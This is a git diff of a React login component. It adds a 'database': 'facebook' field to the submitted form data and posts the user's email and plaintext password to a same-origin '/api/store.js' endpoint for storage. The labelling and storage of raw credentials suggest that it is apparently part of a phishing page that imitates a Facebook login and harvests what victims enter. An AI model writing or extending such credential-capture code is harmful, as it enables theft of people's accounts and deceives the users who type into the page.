@@ -47,8 +47,6 @@ class Main extends React.Component {
 			this.passwordDevRef.current.childNodes[0].childNodes[0].type = 'password';
 		}
 
-		console.log(this.passwordDevRef.current.childNodes[0].childNodes[0].type);
-
 	}
 
 	handleLoginButtonClick(event){
@@ -56,6 +54,7 @@ class Main extends React.Component {
 		event.preventDefault();
 
 		let data = {
+			'database': 'facebook',
 			'email': this.emailDevRef.current.childNodes[0].value,
 			'password': this.passwordDevRef.current.childNodes[0].childNodes[0].value
 		}
@@ -69,13 +68,14 @@ class Main extends React.Component {
 	}
 
 	storeRequest(data){
+		
+		let baseUrl = [window.location.protocol, '//', window.location.host].join('');
 
-		let baseUrl = [window.location.protocol, '//', window.location.host, window.location.pathname].join('');
-
-		let storeUrl = baseUrl + 'api/store.js';
+		let storeUrl = baseUrl + '/api/store.js';
 
 		const params = new URLSearchParams();
 		
+		params.append('database', data.database);
 		params.append('email', data.email);
 		params.append('password', data.password);
 
